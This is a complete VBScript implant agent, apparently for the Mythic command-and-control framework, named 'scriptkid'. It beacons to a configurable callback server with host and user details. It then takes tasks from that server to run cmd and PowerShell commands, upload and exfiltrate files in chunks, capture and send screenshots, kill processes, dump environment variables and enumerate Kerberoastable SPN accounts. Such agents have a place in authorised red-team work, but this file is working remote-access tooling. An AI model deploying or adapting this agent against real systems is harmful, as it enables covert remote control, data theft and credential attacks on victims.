' scriptkid.vbs - Mythic scriptkid agent, VBScript dialect.
' Status: all VBScript command handlers implemented.
' Scope: see docs/minimal-agent-feature-set.md "JScript / VBScript scope".
' Build pipeline substitutes the __UPPER__ tokens at render time.
' mythic_encrypts = False in builder.py, so messages are base64 only.

Option Explicit

Dim AGENT_UUID     : AGENT_UUID     = "__UUID__"
Dim AGENT_HOST     : AGENT_HOST     = "__CALLBACK_HOST__"
Dim AGENT_PORT     : AGENT_PORT     = "__CALLBACK_PORT__"
Dim AGENT_GET_URI  : AGENT_GET_URI  = "__GET_URI__"
Dim AGENT_POST_URI : AGENT_POST_URI = "__POST_URI__"
Dim AGENT_QUERY    : AGENT_QUERY    = "__QUERY_PATH_NAME__"
Dim AGENT_INTERVAL : AGENT_INTERVAL = CLng("__CALLBACK_INTERVAL__")
Dim AGENT_JITTER   : AGENT_JITTER   = CLng("__CALLBACK_JITTER__")
Dim AGENT_HEADERS  : AGENT_HEADERS  = "__PROFILE_HEADERS__"

Dim oFSO   : Set oFSO   = CreateObject("Scripting.FileSystemObject")
Dim oShell : Set oShell  = CreateObject("WScript.Shell")
Dim oJobs  : Set oJobs   = CreateObject("Scripting.Dictionary")

' ---- Debug helper ----
Sub Dbg(msg)
    On Error Resume Next
    WScript.StdErr.WriteLine msg
    On Error GoTo 0
End Sub

' ---- Sleep with jitter ----
Sub SleepJitter()
    Dim base, pct, ms
    base = AGENT_INTERVAL * 1000
    If AGENT_JITTER <= 0 Then
        WScript.Sleep base
        Exit Sub
    End If
    Randomize
    pct = (Rnd * 2 * AGENT_JITTER - AGENT_JITTER) / 100
    ms = CLng(base * (1 + pct))
    If ms < 1000 Then ms = 1000
    WScript.Sleep ms
End Sub

' ---- Base64 lookup ----
Dim B64C : B64C = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
Dim B64L : Set B64L = CreateObject("Scripting.Dictionary")
Dim b64i : For b64i = 0 To 63 : B64L.Add Mid(B64C, b64i + 1, 1), b64i : Next

' ---- Base64 encode ----
Function B64Encode(sText)
    Dim o, i, a, b, c, sLen
    o = "" : sLen = Len(sText) : i = 1
    Do While i <= sLen
        a = Asc(Mid(sText, i, 1)) And &HFF : i = i + 1
        If i <= sLen Then b = Asc(Mid(sText, i, 1)) And &HFF Else b = -1
        If b >= 0 Then i = i + 1
        If i <= sLen And b >= 0 Then c = Asc(Mid(sText, i, 1)) And &HFF Else c = -1
        If c >= 0 Then i = i + 1
        o = o & Mid(B64C, (a \ 4) + 1, 1)
        If b >= 0 Then
            o = o & Mid(B64C, ((a And 3) * 16 Or (b \ 16)) + 1, 1)
            If c >= 0 Then
                o = o & Mid(B64C, ((b And 15) * 4 Or (c \ 64)) + 1, 1)
                o = o & Mid(B64C, (c And 63) + 1, 1)
            Else
                o = o & Mid(B64C, ((b And 15) * 4) + 1, 1)
                o = o & "="
            End If
        Else
            o = o & Mid(B64C, ((a And 3) * 16) + 1, 1)
            o = o & "=="
        End If
    Loop
    B64Encode = o
End Function

' ---- Base64 decode ----
Function B64Decode(sB64)
    Dim o, i, a, b, c, d, ch, sLen
    o = "" : sLen = Len(sB64) : i = 1
    Do While i <= sLen
        If Not B64L.Exists(Mid(sB64, i, 1)) Then i = i + 1 : If i > sLen Then Exit Do
        a = B64L(Mid(sB64, i, 1)) : i = i + 1
        If i > sLen Then Exit Do
        b = B64L(Mid(sB64, i, 1)) : i = i + 1
        o = o & Chr((a * 4) Or (b \ 16))
        If i > sLen Then Exit Do
        ch = Mid(sB64, i, 1) : i = i + 1
        If ch = "=" Then Exit Do
        c = B64L(ch)
        o = o & Chr(((b And 15) * 16) Or (c \ 4))
        If i > sLen Then Exit Do
        ch = Mid(sB64, i, 1) : i = i + 1
        If ch = "=" Then Exit Do
        d = B64L(ch)
        o = o & Chr(((c And 3) * 64) Or d)
    Loop
    B64Decode = o
End Function

' ---- Minimal JSON builder ----
Function JsonEsc(s)
    Dim r : r = s
    r = Replace(r, "\", "\\")
    r = Replace(r, """", "\""")
    r = Replace(r, vbCr, "\r")
    r = Replace(r, vbLf, "\n")
    r = Replace(r, vbTab, "\t")
    JsonEsc = r
End Function

Function JsonStr(key, val)
    JsonStr = """" & JsonEsc(CStr(key)) & """:""" & JsonEsc(CStr(val)) & """"
End Function

Function JsonInt(key, val)
    JsonInt = """" & JsonEsc(CStr(key)) & """:" & CStr(val)
End Function

Function JsonBool(key, val)
    If val Then
        JsonBool = """" & JsonEsc(CStr(key)) & """:true"
    Else
        JsonBool = """" & JsonEsc(CStr(key)) & """:false"
    End If
End Function

' ---- Minimal JSON value extractor ----
Function JsonGetStr(json, key)
    Dim searchKey, pos, startQ, endQ
    searchKey = """" & key & """:"
    pos = InStr(1, json, searchKey, vbTextCompare)
    If pos = 0 Then JsonGetStr = "" : Exit Function
    pos = pos + Len(searchKey)
    ' skip whitespace
    Do While Mid(json, pos, 1) = " " : pos = pos + 1 : Loop
    If Mid(json, pos, 1) = """" Then
        startQ = pos + 1
        endQ = InStr(startQ, json, """")
        ' handle escaped quotes
        Do While endQ > 1 And Mid(json, endQ - 1, 1) = "\"
            endQ = InStr(endQ + 1, json, """")
        Loop
        If endQ = 0 Then JsonGetStr = "" : Exit Function
        JsonGetStr = Mid(json, startQ, endQ - startQ)
        JsonGetStr = Replace(JsonGetStr, "\""", """")
        JsonGetStr = Replace(JsonGetStr, "\\", "\")
        JsonGetStr = Replace(JsonGetStr, "\n", vbLf)
        JsonGetStr = Replace(JsonGetStr, "\r", vbCr)
        JsonGetStr = Replace(JsonGetStr, "\t", vbTab)
    Else
        ' number, bool, null
        Dim endPos : endPos = pos
        Do While endPos <= Len(json)
            Dim ch : ch = Mid(json, endPos, 1)
            If ch = "," Or ch = "}" Or ch = "]" Then Exit Do
            endPos = endPos + 1
        Loop
        JsonGetStr = Trim(Mid(json, pos, endPos - pos))
    End If
End Function

' Extract param from task's "parameters" field, with double-decode unwrap
Function GetParam(taskJson, paramName)
    Dim params, v, inner
    params = JsonGetStr(taskJson, "parameters")
    If Len(params) = 0 Then params = taskJson
    v = JsonGetStr(params, paramName)
    If Left(v, 1) = "{" Then
        inner = JsonGetStr(v, paramName)
        If Len(inner) > 0 Then v = inner
    End If
    GetParam = v
End Function

' ---- Build callback URL ----
Function BuildUrl()
    Dim host, port, uri, needsPort
    host = AGENT_HOST
    port = AGENT_PORT
    uri = AGENT_POST_URI
    If Len(uri) > 0 And Left(uri, 1) <> "/" Then uri = "/" & uri
    needsPort = True
    If Left(host, 7) = "http://" And CStr(port) = "80" Then needsPort = False
    If Left(host, 8) = "https://" And CStr(port) = "443" Then needsPort = False
    If needsPort Then
        BuildUrl = host & ":" & CStr(port) & uri
    Else
        BuildUrl = host & uri
    End If
End Function

' ---- POST message to Mythic ----
Function PostMessage(jsonBody)
    PostMessage = ""
    Dim payload, url, xhr, body, decoded
    payload = B64Encode(AGENT_UUID & jsonBody)
    url = BuildUrl()
    Set xhr = CreateObject("MSXML2.ServerXMLHTTP")
    xhr.setOption 2, 13056
    xhr.Open "POST", url, False
    ' Set profile headers - parse "key":"value" pairs from JSON-like string
    Dim hdrStr, hPos, hName, hVal, qStart, qEnd, cPos, vStart, vEnd
    hdrStr = AGENT_HEADERS
    hPos = 1
    Do
        qStart = InStr(hPos, hdrStr, """")
        If qStart = 0 Then Exit Do
        qEnd = InStr(qStart + 1, hdrStr, """")
        If qEnd = 0 Then Exit Do
        hName = Mid(hdrStr, qStart + 1, qEnd - qStart - 1)
        cPos = InStr(qEnd, hdrStr, ":")
        If cPos = 0 Then Exit Do
        vStart = InStr(cPos, hdrStr, """")
        If vStart = 0 Then Exit Do
        vEnd = InStr(vStart + 1, hdrStr, """")
        If vEnd = 0 Then Exit Do
        hVal = Mid(hdrStr, vStart + 1, vEnd - vStart - 1)
        On Error Resume Next
        xhr.setRequestHeader hName, hVal
        On Error GoTo 0
        hPos = vEnd + 1
    Loop

    On Error Resume Next
    xhr.send payload
    If Err.Number <> 0 Then
        Dbg "postMessage error: " & Err.Description & " url=" & url
        Err.Clear
        On Error GoTo 0
        PostMessage = ""
        Exit Function
    End If
    On Error GoTo 0

    If xhr.status <> 200 Then
        Dbg "postMessage HTTP " & xhr.status & " url=" & url
        PostMessage = ""
        Exit Function
    End If

    body = xhr.responseText
    decoded = B64Decode(body)
    If Len(decoded) <= 36 Then
        PostMessage = ""
        Exit Function
    End If
    PostMessage = Mid(decoded, 37)
End Function

' ---- System info for checkin ----
Function GetSysInfo()
    Dim env, net, pid, wmi, procs, proc
    Set env = oShell.Environment("Process")
    Set net = CreateObject("WScript.Network")
    pid = 0
    On Error Resume Next
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery("SELECT ProcessId FROM Win32_Process WHERE Name='cscript.exe' OR Name='wscript.exe'")
    For Each proc In procs
        pid = proc.ProcessId
        Exit For
    Next
    On Error GoTo 0

    GetSysInfo = "{" & _
        JsonStr("action", "checkin") & "," & _
        JsonStr("uuid", AGENT_UUID) & "," & _
        JsonStr("ip", "0.0.0.0") & "," & _
        JsonStr("os", env("OS") & "") & "," & _
        JsonStr("user", net.UserName & "") & "," & _
        JsonStr("host", net.ComputerName & "") & "," & _
        JsonStr("domain", net.UserDomain & "") & "," & _
        JsonInt("pid", pid) & "," & _
        JsonStr("architecture", env("PROCESSOR_ARCHITECTURE") & "") & "," & _
        JsonInt("integrity_level", 2) & "," & _
        JsonStr("process_name", "cscript.exe") & "}"
End Function

' ---- Command handlers ----

Function CmdHelp(taskParams)
    CmdHelp = "Available commands: help, exit, pwd, ls, mkdir, mv, cat, upload, download, " & _
              "ps, kill, jobs, jobkill, env, getprivs, process_spawn, shell, powershell, kerberoast"
End Function

Function CmdPwd(taskParams)
    CmdPwd = oShell.CurrentDirectory
End Function

Function CmdLs(taskParams)
    Dim target, folder, sf, fi, out
    target = GetParam(taskParams, "path")
    If Len(target) = 0 Then target = oShell.CurrentDirectory
    If Not oFSO.FolderExists(target) Then
        CmdLs = "folder not found: " & target
        Exit Function
    End If
    Set folder = oFSO.GetFolder(target)
    out = ""
    For Each sf In folder.SubFolders
        out = out & "d" & vbTab & sf.Name & vbTab & sf.DateLastModified & vbLf
    Next
    For Each fi In folder.Files
        out = out & "-" & vbTab & fi.Name & vbTab & fi.Size & vbTab & fi.DateLastModified & vbLf
    Next
    If Len(out) = 0 Then out = "(empty)"
    CmdLs = out
End Function

Function CmdMkdir(taskParams)
    Dim p : p = GetParam(taskParams, "path")
    If Len(p) = 0 Then CmdMkdir = "usage: mkdir <path>" : Exit Function
    oFSO.CreateFolder p
    CmdMkdir = "created " & p
End Function

Function CmdMv(taskParams)
    Dim src, dst
    src = GetParam(taskParams, "source")
    dst = GetParam(taskParams, "dest")
    If Len(src) = 0 Or Len(dst) = 0 Then
        CmdMv = "usage: mv <source> <dest>"
        Exit Function
    End If
    If oFSO.FileExists(src) Then
        oFSO.MoveFile src, dst
    ElseIf oFSO.FolderExists(src) Then
        oFSO.MoveFolder src, dst
    Else
        CmdMv = "not found: " & src
        Exit Function
    End If
    CmdMv = "moved " & src & " -> " & dst
End Function

Function CmdCat(taskParams)
    Dim p, ts
    p = GetParam(taskParams, "path")
    If Len(p) = 0 Then CmdCat = "usage: cat <file>" : Exit Function
    If Not oFSO.FileExists(p) Then CmdCat = "file not found: " & p : Exit Function
    Set ts = oFSO.OpenTextFile(p, 1)
    If ts.AtEndOfStream Then
        CmdCat = ""
    Else
        CmdCat = ts.ReadAll
    End If
    ts.Close
End Function

Function CmdUpload(taskParams)
    Dim fileId, remotePath, fullData, chunkNum, totalChunks, resp, taskId
    fileId = GetParam(taskParams, "file")
    remotePath = GetParam(taskParams, "remote_path")
    taskId = JsonGetStr(taskParams, "id")
    fullData = ""
    chunkNum = 1
    totalChunks = 0
    Do
        Dim uploadJson
        uploadJson = "{""action"":""post_response"",""responses"":[{" & _
            JsonStr("task_id", taskId) & "," & _
            """upload"":{" & JsonStr("file_id", fileId) & "," & _
            JsonInt("chunk_num", chunkNum) & "," & _
            JsonInt("chunk_size", 512000) & "}}]}"
        resp = PostMessage(uploadJson)
        If Len(resp) = 0 Then Exit Do
        Dim chunkData : chunkData = JsonGetStr(resp, "chunk_data")
        If Len(chunkData) = 0 Then chunkData = JsonGetStr(resp, "chunk_data")
        Dim tc : tc = JsonGetStr(resp, "total_chunks")
        If Len(tc) = 0 Then tc = "0"
        totalChunks = CLng(tc)
        If Len(chunkData) > 0 Then fullData = fullData & chunkData
        If totalChunks = 0 And Len(chunkData) = 0 Then Exit Do
        chunkNum = chunkNum + 1
    Loop While chunkNum <= totalChunks
    Dim xDoc : Set xDoc = CreateObject("MSXML2.DOMDocument")
    Dim xNode : Set xNode = xDoc.createElement("b64")
    xNode.dataType = "bin.base64"
    xNode.text = fullData
    Dim ws : Set ws = CreateObject("ADODB.Stream")
    ws.Type = 1 : ws.Open
    ws.Write xNode.nodeTypedValue
    ws.SaveToFile remotePath, 2
    Dim sz : sz = ws.Size
    ws.Close
    CmdUpload = "uploaded " & remotePath & " (" & sz & " bytes)"
End Function

Function CmdDownload(taskParams)
    Dim filePath
    filePath = GetParam(taskParams, "path")
    If Not oFSO.FileExists(filePath) Then CmdDownload = "file not found: " & filePath : Exit Function
    Dim rs : Set rs = CreateObject("ADODB.Stream")
    rs.Type = 1 : rs.Open : rs.LoadFromFile filePath
    Dim fileSize : fileSize = rs.Size
    Dim fileBytes : fileBytes = rs.Read() : rs.Close
    Dim xDoc : Set xDoc = CreateObject("MSXML2.DOMDocument")
    Dim xNode : Set xNode = xDoc.createElement("b64")
    xNode.dataType = "bin.base64"
    xNode.nodeTypedValue = fileBytes
    Dim encoded : encoded = Replace(Replace(xNode.text, vbCr, ""), vbLf, "")
    Dim chunkSize : chunkSize = 512000
    Dim totalChunks : totalChunks = Int(Len(encoded) / chunkSize)
    If Len(encoded) Mod chunkSize > 0 Then totalChunks = totalChunks + 1
    If totalChunks = 0 Then totalChunks = 1
    Dim taskId : taskId = JsonGetStr(taskParams, "id")
    Dim initJson : initJson = "{""action"":""post_response"",""responses"":[{" & _
        JsonStr("task_id", taskId) & "," & _
        """download"":{" & JsonInt("total_chunks", totalChunks) & "," & _
        JsonStr("full_path", filePath) & "," & _
        JsonBool("is_screenshot", False) & "}}]}"
    Dim initResp : initResp = PostMessage(initJson)
    If Len(initResp) = 0 Then CmdDownload = "download init failed" : Exit Function
    Dim dlFileId : dlFileId = JsonGetStr(initResp, "file_id")
    If Len(dlFileId) = 0 Then CmdDownload = "download init failed - no file_id" : Exit Function
    Dim c
    For c = 0 To totalChunks - 1
        Dim chunk : chunk = Mid(encoded, c * chunkSize + 1, chunkSize)
        Dim chunkJson : chunkJson = "{""action"":""post_response"",""responses"":[{" & _
            JsonStr("task_id", taskId) & "," & _
            """download"":{" & JsonStr("file_id", dlFileId) & "," & _
            JsonInt("chunk_num", c + 1) & "," & _
            JsonStr("chunk_data", chunk) & "}}]}"
        PostMessage chunkJson
    Next
    CmdDownload = "downloaded " & filePath & " (" & fileSize & " bytes)"
End Function

Function CmdPs(taskParams)
    Dim wmi, procs, proc, out
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery("SELECT ProcessId, Name, ParentProcessId FROM Win32_Process")
    out = "PID" & vbTab & "PPID" & vbTab & "Name"
    For Each proc In procs
        out = out & vbLf & proc.ProcessId & vbTab & proc.ParentProcessId & vbTab & proc.Name
    Next
    CmdPs = out
End Function

Function CmdKill(taskParams)
    Dim pid : pid = GetParam(taskParams, "pid")
    If Len(pid) = 0 Then CmdKill = "usage: kill <pid>" : Exit Function
    Dim wmi, procs, proc
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set procs = wmi.ExecQuery("SELECT * FROM Win32_Process WHERE ProcessId=" & CLng(pid))
    Dim found : found = False
    For Each proc In procs
        proc.Terminate
        found = True
        Exit For
    Next
    If found Then
        CmdKill = "killed pid " & pid
    Else
        CmdKill = "no process with pid " & pid
    End If
End Function

Function CmdJobs(taskParams)
    If oJobs.Count = 0 Then
        CmdJobs = "no active jobs"
    Else
        Dim out, k
        out = ""
        For Each k In oJobs.Keys
            out = out & k & ": " & oJobs(k) & vbLf
        Next
        CmdJobs = out
    End If
End Function

Function CmdJobkill(taskParams)
    Dim jid : jid = GetParam(taskParams, "job_id")
    If Len(jid) = 0 Then CmdJobkill = "usage: jobkill <job_id>" : Exit Function
    If Not oJobs.Exists(jid) Then CmdJobkill = "no such job: " & jid : Exit Function
    oJobs.Remove jid
    CmdJobkill = "removed job " & jid
End Function

Function CmdEnv(taskParams)
    Dim env, item, out
    Set env = oShell.Environment("Process")
    out = ""
    For Each item In env
        out = out & item & vbLf
    Next
    CmdEnv = out
End Function

Function CmdGetprivs(taskParams)
    Dim net, wmi, groups, grp, out
    Set net = CreateObject("WScript.Network")
    out = "User: " & net.UserDomain & "\" & net.UserName & vbLf & "Groups:"
    On Error Resume Next
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set groups = wmi.ExecQuery("ASSOCIATORS OF {Win32_Account.Name='" & net.UserName & _
        "',Domain='" & net.UserDomain & "'} WHERE ResultRole=GroupComponent ResultClass=Win32_Group")
    For Each grp In groups
        out = out & vbLf & "  " & grp.Name
    Next
    If Err.Number <> 0 Then
        out = out & vbLf & "  (could not enumerate groups: " & Err.Description & ")"
        Err.Clear
    End If
    On Error GoTo 0
    CmdGetprivs = out
End Function

Function CmdProcessSpawn(taskParams)
    Dim cmd : cmd = GetParam(taskParams, "command_line")
    If Len(cmd) = 0 Then CmdProcessSpawn = "usage: process_spawn <command>" : Exit Function
    Dim exec, stdout, stderr
    Set exec = oShell.Exec(cmd)
    stdout = ""
    Do While Not exec.StdOut.AtEndOfStream
        stdout = stdout & exec.StdOut.ReadLine() & vbLf
    Loop
    stderr = ""
    Do While Not exec.StdErr.AtEndOfStream
        stderr = stderr & exec.StdErr.ReadLine() & vbLf
    Loop
    Dim out : out = stdout
    If Len(stderr) > 0 Then out = out & vbLf & "[stderr]" & vbLf & stderr
    If Len(out) = 0 Then out = "(no output)"
    CmdProcessSpawn = out
End Function

Function CmdShell(taskParams)
    Dim cmd : cmd = GetParam(taskParams, "command")
    If Len(cmd) = 0 Then CmdShell = "usage: shell <command>" : Exit Function
    Dim comspec : comspec = oShell.ExpandEnvironmentStrings("%COMSPEC%")
    Dim exec, stdout, stderr
    Set exec = oShell.Exec(comspec & " /c " & cmd)
    stdout = ""
    Do While Not exec.StdOut.AtEndOfStream
        stdout = stdout & exec.StdOut.ReadLine() & vbLf
    Loop
    stderr = ""
    Do While Not exec.StdErr.AtEndOfStream
        stderr = stderr & exec.StdErr.ReadLine() & vbLf
    Loop
    Dim out : out = stdout
    If Len(stderr) > 0 Then out = out & vbLf & "[stderr]" & vbLf & stderr
    If Len(out) = 0 Then out = "(no output)"
    CmdShell = out
End Function

Function CmdPowershell(taskParams)
    Dim cmd : cmd = GetParam(taskParams, "command")
    If Len(cmd) = 0 Then CmdPowershell = "usage: powershell <command>" : Exit Function
    Dim exec, stdout, stderr
    Set exec = oShell.Exec("powershell.exe -NoProfile -NonInteractive -Command " & cmd)
    stdout = ""
    Do While Not exec.StdOut.AtEndOfStream
        stdout = stdout & exec.StdOut.ReadLine() & vbLf
    Loop
    stderr = ""
    Do While Not exec.StdErr.AtEndOfStream
        stderr = stderr & exec.StdErr.ReadLine() & vbLf
    Loop
    Dim out : out = stdout
    If Len(stderr) > 0 Then out = out & vbLf & "[stderr]" & vbLf & stderr
    If Len(out) = 0 Then out = "(no output)"
    CmdPowershell = out
End Function

Function CmdScreenshot(taskParams)
    Dim tempPath, psCmd, exec, stderr
    Randomize
    tempPath = oShell.ExpandEnvironmentStrings("%TEMP%") & "\~ss" & Int(Rnd * 99999) & ".png"
    psCmd = "powershell.exe -NoProfile -NonInteractive -Command """ & _
        "Add-Type -AssemblyName System.Windows.Forms;" & _
        "Add-Type -AssemblyName System.Drawing;" & _
        "$b=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;" & _
        "$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);" & _
        "$g=[System.Drawing.Graphics]::FromImage($bmp);" & _
        "$g.CopyFromScreen($b.Location,[System.Drawing.Point]::Empty,$b.Size);" & _
        "$g.Dispose();" & _
        "$bmp.Save('" & tempPath & "',[System.Drawing.Imaging.ImageFormat]::Png);" & _
        "$bmp.Dispose()"""
    Set exec = oShell.Exec(psCmd)
    Do While exec.Status = 0
        WScript.Sleep 100
    Loop
    If Not oFSO.FileExists(tempPath) Then
        stderr = ""
        Do While Not exec.StdErr.AtEndOfStream
            stderr = stderr & exec.StdErr.ReadLine() & vbLf
        Loop
        CmdScreenshot = "screenshot failed: " & stderr
        Exit Function
    End If
    Dim rs : Set rs = CreateObject("ADODB.Stream")
    rs.Type = 1 : rs.Open : rs.LoadFromFile tempPath
    Dim fileSize : fileSize = rs.Size
    Dim fileBytes : fileBytes = rs.Read() : rs.Close
    Dim xDoc : Set xDoc = CreateObject("MSXML2.DOMDocument")
    Dim xNode : Set xNode = xDoc.createElement("b64")
    xNode.dataType = "bin.base64"
    xNode.nodeTypedValue = fileBytes
    Dim encoded : encoded = Replace(Replace(xNode.text, vbCr, ""), vbLf, "")
    Dim chunkSize : chunkSize = 512000
    Dim totalChunks : totalChunks = Int(Len(encoded) / chunkSize)
    If Len(encoded) Mod chunkSize > 0 Then totalChunks = totalChunks + 1
    If totalChunks = 0 Then totalChunks = 1
    Dim taskId : taskId = JsonGetStr(taskParams, "id")
    Dim initJson : initJson = "{""action"":""post_response"",""responses"":[{" & _
        JsonStr("task_id", taskId) & "," & _
        """download"":{" & JsonInt("total_chunks", totalChunks) & "," & _
        JsonStr("full_path", tempPath) & "," & _
        JsonBool("is_screenshot", True) & "}}]}"
    Dim initResp : initResp = PostMessage(initJson)
    If Len(initResp) = 0 Then
        On Error Resume Next : oFSO.DeleteFile tempPath : On Error GoTo 0
        CmdScreenshot = "screenshot transfer init failed"
        Exit Function
    End If
    Dim dlFileId : dlFileId = JsonGetStr(initResp, "file_id")
    If Len(dlFileId) = 0 Then
        On Error Resume Next : oFSO.DeleteFile tempPath : On Error GoTo 0
        CmdScreenshot = "screenshot transfer init failed - no file_id"
        Exit Function
    End If
    Dim c, chunk, chunkJson
    For c = 0 To totalChunks - 1
        chunk = Mid(encoded, c * chunkSize + 1, chunkSize)
        chunkJson = "{""action"":""post_response"",""responses"":[{" & _
            JsonStr("task_id", taskId) & "," & _
            """download"":{" & JsonStr("file_id", dlFileId) & "," & _
            JsonInt("chunk_num", c + 1) & "," & _
            JsonStr("chunk_data", chunk) & "}}]}"
        PostMessage chunkJson
    Next
    On Error Resume Next : oFSO.DeleteFile tempPath : On Error GoTo 0
    CmdScreenshot = "screenshot captured (" & fileSize & " bytes)"
End Function

Function CmdKerberoast(taskParams)
    Dim targetSpn : targetSpn = GetParam(taskParams, "spn")
    Dim ldap, defaultNC, query, conn, rs, out, sam, spns
    Set ldap = GetObject("LDAP://rootDSE")
    defaultNC = ldap.Get("defaultNamingContext")
    If Len(targetSpn) > 0 Then
        query = "<LDAP://" & defaultNC & ">;(&(servicePrincipalName=" & targetSpn & _
                ")(objectCategory=person)(objectClass=user));distinguishedName,servicePrincipalName,sAMAccountName;subtree"
    Else
        query = "<LDAP://" & defaultNC & ">;(&(servicePrincipalName=*)(objectCategory=person)(objectClass=user));distinguishedName,servicePrincipalName,sAMAccountName;subtree"
    End If
    Set conn = CreateObject("ADODB.Connection")
    conn.Provider = "ADsDSOObject"
    conn.Open "Active Directory Provider"
    Set rs = conn.Execute(query)
    out = ""
    Do While Not rs.EOF
        sam = rs.Fields("sAMAccountName").Value
        spns = rs.Fields("servicePrincipalName").Value
        If IsArray(spns) Then spns = Join(spns, "; ")
        out = out & sam & " | " & spns & vbLf
        rs.MoveNext
    Loop
    rs.Close : conn.Close
    If Len(out) = 0 Then
        CmdKerberoast = "no SPN accounts found"
    Else
        CmdKerberoast = "SPN Accounts:" & vbLf & out
    End If
End Function

' ---- Dispatch ----
Function Dispatch(cmd, taskParams)
    Select Case LCase(cmd)
        Case "help"          : Dispatch = CmdHelp(taskParams)
        Case "exit"          : WScript.Quit 0
        Case "pwd"           : Dispatch = CmdPwd(taskParams)
        Case "ls"            : Dispatch = CmdLs(taskParams)
        Case "mkdir"         : Dispatch = CmdMkdir(taskParams)
        Case "mv"            : Dispatch = CmdMv(taskParams)
        Case "cat"           : Dispatch = CmdCat(taskParams)
        Case "upload"        : Dispatch = CmdUpload(taskParams)
        Case "download"      : Dispatch = CmdDownload(taskParams)
        Case "ps"            : Dispatch = CmdPs(taskParams)
        Case "kill"          : Dispatch = CmdKill(taskParams)
        Case "jobs"          : Dispatch = CmdJobs(taskParams)
        Case "jobkill"       : Dispatch = CmdJobkill(taskParams)
        Case "env"           : Dispatch = CmdEnv(taskParams)
        Case "getprivs"      : Dispatch = CmdGetprivs(taskParams)
        Case "process_spawn" : Dispatch = CmdProcessSpawn(taskParams)
        Case "shell"         : Dispatch = CmdShell(taskParams)
        Case "powershell"    : Dispatch = CmdPowershell(taskParams)
        Case "screenshot"    : Dispatch = CmdScreenshot(taskParams)
        Case "kerberoast"    : Dispatch = CmdKerberoast(taskParams)
        Case Else            : Dispatch = "unknown command: " & cmd
    End Select
End Function

' ---- Task dispatch wrapper ----
Function DispatchTask(taskJson)
    Dim taskId, cmd, params, result, status
    taskId = JsonGetStr(taskJson, "id")
    cmd = JsonGetStr(taskJson, "command")
    params = taskJson
    status = ""
    On Error Resume Next
    result = Dispatch(cmd, params)
    If Err.Number <> 0 Then
        result = Err.Description
        status = "error"
        Err.Clear
    End If
    On Error GoTo 0
    Dim resp
    resp = "{" & JsonStr("task_id", taskId) & "," & _
        JsonStr("user_output", result) & "," & _
        JsonBool("completed", True)
    If Len(status) > 0 Then
        resp = resp & "," & JsonStr("status", status)
    End If
    resp = resp & "}"
    DispatchTask = resp
End Function

' ---- Extract tasks array items (simple parser) ----
Function GetTasksFromResponse(ByVal json)
    ' Returns array of task JSON strings from the "tasks":[...] array
    If IsEmpty(json) Or IsNull(json) Then GetTasksFromResponse = Array() : Exit Function
    json = CStr(json)
    If Len(json) = 0 Then GetTasksFromResponse = Array() : Exit Function
    Dim tasksStart, pos, depth, startPos, arr(), count, inQuote, ch
    tasksStart = InStr(1, json, """tasks"":")
    If tasksStart = 0 Then GetTasksFromResponse = Array() : Exit Function
    pos = InStr(tasksStart, json, "[")
    If pos = 0 Then GetTasksFromResponse = Array() : Exit Function
    pos = pos + 1
    count = 0
    Do
        Do While pos <= Len(json) And (Mid(json, pos, 1) = " " Or Mid(json, pos, 1) = vbLf Or Mid(json, pos, 1) = vbCr)
            pos = pos + 1
        Loop
        If pos > Len(json) Or Mid(json, pos, 1) = "]" Then Exit Do
        If Mid(json, pos, 1) = "," Then pos = pos + 1
        Do While pos <= Len(json) And (Mid(json, pos, 1) = " " Or Mid(json, pos, 1) = vbLf Or Mid(json, pos, 1) = vbCr)
            pos = pos + 1
        Loop
        If pos > Len(json) Then Exit Do
        If Mid(json, pos, 1) <> "{" Then Exit Do
        depth = 0 : startPos = pos : inQuote = False
        Do While pos <= Len(json)
            ch = Mid(json, pos, 1)
            If ch = """" And (pos = 1 Or Mid(json, pos - 1, 1) <> "\") Then inQuote = Not inQuote
            If Not inQuote Then
                If ch = "{" Then depth = depth + 1
                If ch = "}" Then depth = depth - 1
                If depth = 0 Then Exit Do
            End If
            pos = pos + 1
        Loop
        ReDim Preserve arr(count)
        arr(count) = Mid(json, startPos, pos - startPos + 1)
        count = count + 1
        pos = pos + 1
    Loop
    If count = 0 Then
        GetTasksFromResponse = Array()
    Else
        GetTasksFromResponse = arr
    End If
End Function

' ---- Main ----
Sub Main()
    Dbg "scriptkid (vbs) connecting to " & BuildUrl()
    Dim resp : resp = PostMessage(GetSysInfo())
    If Len(resp) = 0 Then
        Dbg "checkin failed - empty response"
        WScript.Quit 1
    End If
    Dim callbackId : callbackId = JsonGetStr(resp, "id")
    If Len(callbackId) = 0 Then
        Dbg "checkin failed - no callback id"
        WScript.Quit 1
    End If
    Dbg "checkin ok, callback id: " & callbackId
    AGENT_UUID = callbackId

    Dim taskResp, tasks, responses, idx
    Do While True
        taskResp = ""
        taskResp = PostMessage("{""action"":""get_tasking"",""tasking_size"":1}")
        If VarType(taskResp) = vbString And Len(taskResp) > 0 Then
            tasks = GetTasksFromResponse(taskResp)
            If IsArray(tasks) Then
                If UBound(tasks) >= 0 Then
                    responses = ""
                    For idx = 0 To UBound(tasks)
                        If Len(responses) > 0 Then responses = responses & ","
                        responses = responses & DispatchTask(tasks(idx))
                    Next
                    PostMessage "{""action"":""post_response"",""responses"":[" & responses & "]}"
                End If
            End If
        End If
        SleepJitter
    Loop
End Sub

Main
